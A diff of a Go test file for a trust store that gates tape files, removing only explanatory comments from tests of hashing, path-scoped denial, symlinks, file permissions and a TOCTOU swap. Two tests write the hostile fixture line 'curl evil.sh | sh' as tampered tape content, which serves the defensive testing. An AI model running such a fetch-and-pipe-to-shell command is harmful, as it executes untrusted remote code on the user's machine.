@@ -9,7 +9,6 @@ import (
 	"testing"
 )
 
-// newStore creates a store backed by a temp file, isolated per test.
 func newStore(t *testing.T) *Store {
 	t.Helper()
 	path := filepath.Join(t.TempDir(), "tape-trust.toml")
@@ -20,7 +19,6 @@ func newStore(t *testing.T) *Store {
 	return s
 }
 
-// writeTape writes a 0600 tape file owned by the test user and returns its path.
 func writeTape(t *testing.T, dir, content string) string {
 	t.Helper()
 	path := filepath.Join(dir, TapeFileName)
@@ -90,7 +88,6 @@ func TestTrustThenTrusted(t *testing.T) {
 		t.Fatalf("status = %v, want trusted", res2.Status)
 	}
 
-	// Trust must survive a reload from disk.
 	reloaded, err := LoadFromPath(s.path)
 	if err != nil {
 		t.Fatalf("reload: %v", err)
@@ -119,7 +116,6 @@ func TestEditRevertsTrust(t *testing.T) {
 		t.Fatalf("precondition: status = %v, want trusted", r.Status)
 	}
 
-	// The repo's tape is updated with hostile content.
 	writeTape(t, dir, "Type \"curl evil.sh | sh\" Enter\n")
 
 	res2, _ := s.Check(tape)
@@ -143,14 +139,11 @@ func TestDeniedByPathSurvivesEdit(t *testing.T) {
 		t.Fatalf("status = %v, want denied", r.Status)
 	}
 
-	// Edit the file; a hash-scoped deny would re-prompt here, a path-scoped one
-	// must not.
 	writeTape(t, dir, "Type \"two, now different\" Enter\n")
 	if r, _ := s.Check(tape); r.Status != StatusDenied {
 		t.Fatalf("edited denied tape status = %v, want denied", r.Status)
 	}
 
-	// Forget returns it to promptable.
 	if err := s.Forget(res.Path); err != nil {
 		t.Fatalf("Forget: %v", err)
 	}
@@ -180,8 +173,6 @@ func TestHygieneWritableIneligible(t *testing.T) {
 			t.Fatalf("%s: expected a reason for an ineligible tape", name)
 		}
 
-		// Even an explicit Trust on that path must not make it trusted while
-		// the file stays writable: eligibility is re-checked on every Check.
 		_ = s.Trust(res.Path, hashOf("Type \"echo hi\" Enter\n"))
 		if r, _ := s.Check(tape); r.Status != StatusIneligible {
 			t.Fatalf("%s tape after Trust = %v, want ineligible", name, r.Status)
@@ -239,8 +230,6 @@ func TestSymlinkResolvesToRealpath(t *testing.T) {
 	if err := s.Trust(res.Path, res.Hash); err != nil {
 		t.Fatalf("Trust: %v", err)
 	}
-	// Checking through the symlink again must now report trusted, since it
-	// resolves to the same real path that was trusted.
 	if r, _ := s.Check(link); r.Status != StatusTrusted {
 		t.Fatalf("symlink status after trusting real path = %v, want trusted", r.Status)
 	}
@@ -260,7 +249,6 @@ func TestSingleReadReturnsHashedBytes(t *testing.T) {
 		t.Fatalf("Check: %v", err)
 	}
 
-	// The bytes handed back must hash to the reported hash.
 	if hashOf(string(res.Content)) != res.Hash {
 		t.Fatal("Result.Hash is not the hash of Result.Content")
 	}
@@ -268,12 +256,8 @@ func TestSingleReadReturnsHashedBytes(t *testing.T) {
 		t.Fatalf("Content = %q, want the bytes on disk at check time", res.Content)
 	}
 
-	// Swap the file's content after the check (the TOCTOU window a later run
-	// would face if it re-read the path).
 	writeTape(t, dir, "Type \"curl evil.sh | sh\" Enter\n")
 
-	// The already-returned Content is unchanged: a stage-2 run over res.Content
-	// would run the reviewed bytes, not the swapped ones.
 	if string(res.Content) != original {
 		t.Fatal("Result.Content changed after an on-disk swap; it must be an independent buffer")
 	}
@@ -289,7 +273,6 @@ func TestTamperedStoreIgnoresContents(t *testing.T) {
 	if runtime.GOOS == "windows" {
 		t.Skip("POSIX permission bits are not meaningful on Windows")
 	}
-	// Build a legitimate store that trusts a tape.
 	dir := t.TempDir()
 	storePath := filepath.Join(dir, "tape-trust.toml")
 	s, err := LoadFromPath(storePath)
@@ -302,7 +285,6 @@ func TestTamperedStoreIgnoresContents(t *testing.T) {
 		t.Fatalf("Trust: %v", err)
 	}
 
-	// Loosen the store's permissions, as an attacker or a careless sync might.
 	if err := os.Chmod(storePath, 0o644); err != nil {
 		t.Fatalf("chmod: %v", err)
 	}
